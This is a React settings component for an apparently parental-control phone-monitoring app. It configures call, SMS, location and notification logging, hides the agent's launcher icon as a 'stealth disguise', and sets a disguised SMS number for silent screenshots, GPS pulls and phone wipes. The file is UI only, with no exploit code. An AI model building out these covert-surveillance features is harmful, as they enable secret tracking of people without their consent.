import React, { useEffect, useState } from 'react';
import { useDeviceStore } from '../store/deviceStore';
import { WebRtcRepository } from '../firebase/webrtcRepository';
import { Settings, Eye, EyeOff, Save, ShieldAlert, ToggleLeft, ToggleRight } from 'lucide-react';

export const SettingsControl: React.FC = () => {
  const { selectedDevice } = useDeviceStore();
  const [settings, setSettings] = useState({
    monitoringEnabled: true,
    agentHidden: false,
    parentPhoneNumber: '',
    friendDisguiseNumber: '',
    childPhoneNumber: ''
  });

  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    if (!selectedDevice) return;

    const unsub = WebRtcRepository.subscribeDeviceConfig(selectedDevice, (config) => {
      setSettings({
        monitoringEnabled: config.monitoringEnabled,
        agentHidden: config.agentHidden,
        parentPhoneNumber: config.parentPhoneNumber,
        friendDisguiseNumber: config.friendDisguiseNumber,
        childPhoneNumber: config.childPhoneNumber
      });
    });

    return () => unsub();
  }, [selectedDevice]);

  const handleToggle = async (key: 'monitoringEnabled' | 'agentHidden') => {
    try {
      const nextVal = !settings[key];
      setSettings(prev => ({ ...prev, [key]: nextVal }));
      await WebRtcRepository.updateSettings(selectedDevice, { [key]: nextVal });
    } catch (err) {
      console.error(err);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      await WebRtcRepository.updateSettings(selectedDevice, {
        parentPhoneNumber: settings.parentPhoneNumber,
        friendDisguiseNumber: settings.friendDisguiseNumber,
        childPhoneNumber: settings.childPhoneNumber
      });
      alert('Settings saved successfully!');
    } catch (err) {
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-bold flex items-center gap-2 text-brandCyan">
          <Settings className="h-6 w-6" />
          Child Agent Device Rules
        </h2>
        <p className="text-xs text-mutedText mt-1">Configure telemetry switches, disguised SMS number and general parental control rules</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Toggle switches */}
        <div className="lg:col-span-2 space-y-4">
          <div className="glass-panel p-6 rounded-2xl border border-darkBorder flex items-center justify-between shadow">
            <div>
              <h3 className="text-xs font-bold text-gray-200">Real-time Activity Monitoring</h3>
              <p className="text-[10px] text-mutedText mt-1">Toggles logging of calls, SMS, location and notification feeds</p>
            </div>
            <button
              onClick={() => handleToggle('monitoringEnabled')}
              className="p-1 hover:bg-darkSurf rounded-lg transition-all"
            >
              {settings.monitoringEnabled ? (
                <ToggleRight className="h-8 w-8 text-brandTeal" />
              ) : (
                <ToggleLeft className="h-8 w-8 text-mutedText" />
              )}
            </button>
          </div>

          <div className="glass-panel p-6 rounded-2xl border border-darkBorder flex items-center justify-between shadow">
            <div>
              <h3 className="text-xs font-bold text-gray-200">Hide System Monitor Launcher Icon</h3>
              <p className="text-[10px] text-mutedText mt-1">Stealth disguise: hides the child agent application from screen app drawer list</p>
            </div>
            <button
              onClick={() => handleToggle('agentHidden')}
              className="p-1 hover:bg-darkSurf rounded-lg transition-all"
            >
              {settings.agentHidden ? (
                <EyeOff className="h-7 w-7 text-brandCyan" />
              ) : (
                <Eye className="h-7 w-7 text-mutedText" />
              )}
            </button>
          </div>

          {/* Form settings */}
          <div className="glass-panel p-6 rounded-2xl border border-darkBorder shadow-lg">
            <h3 className="text-sm font-bold text-brandCyan mb-4 flex items-center gap-1.5">
              <ShieldAlert className="h-4.5 w-4.5" />
              Emergency Phone Overrides
            </h3>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-[10px] uppercase font-bold text-mutedText mb-1.5">Parent Override Mobile Number</label>
                  <input
                    type="text"
                    value={settings.parentPhoneNumber}
                    onChange={(e) => setSettings(prev => ({ ...prev, parentPhoneNumber: e.target.value }))}
                    className="w-full bg-darkSurf border border-darkBorder rounded-xl text-xs px-3 py-2.5 text-gray-200 focus:outline-none focus:border-brandCyan"
                    placeholder="e.g. +15550199"
                  />
                </div>
                <div>
                  <label className="block text-[10px] uppercase font-bold text-mutedText mb-1.5">Disguised Friend Secret SMS Number</label>
                  <input
                    type="text"
                    value={settings.friendDisguiseNumber}
                    onChange={(e) => setSettings(prev => ({ ...prev, friendDisguiseNumber: e.target.value }))}
                    className="w-full bg-darkSurf border border-darkBorder rounded-xl text-xs px-3 py-2.5 text-gray-200 focus:outline-none focus:border-brandCyan"
                    placeholder="e.g. +15550100"
                  />
                </div>
              </div>

              <div>
                <label className="block text-[10px] uppercase font-bold text-mutedText mb-1.5">Child Device Phone Number</label>
                <input
                  type="text"
                  value={settings.childPhoneNumber}
                  onChange={(e) => setSettings(prev => ({ ...prev, childPhoneNumber: e.target.value }))}
                  className="w-full bg-darkSurf border border-darkBorder rounded-xl text-xs px-3 py-2.5 text-gray-200 focus:outline-none focus:border-brandCyan"
                  placeholder="e.g. +15550155"
                />
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-fit bg-brandCyan text-darkBg hover:bg-brandCyan/80 disabled:opacity-50 font-bold text-xs px-6 py-2.5 rounded-xl flex items-center gap-1.5 transition-all shadow-md"
              >
                <Save className="h-4 w-4" />
                {isLoading ? 'Saving...' : 'Save Settings Override'}
              </button>
            </form>
          </div>
        </div>

        {/* Right Info sidebar */}
        <div className="glass-panel p-6 rounded-2xl shadow-lg border border-darkBorder h-fit space-y-4">
          <h3 className="text-xs font-bold text-gray-200 uppercase tracking-widest border-b border-darkBorder pb-2">Parental Policies</h3>
          <p className="text-xs text-mutedText leading-relaxed">
            The disguised SMS number allows you to trigger stealth screenshots, GPS updates, and phone wipes silently via SMS text command codes if the target device loses WiFi/internet access.
          </p>
        </div>
      </div>
    </div>
  );
};
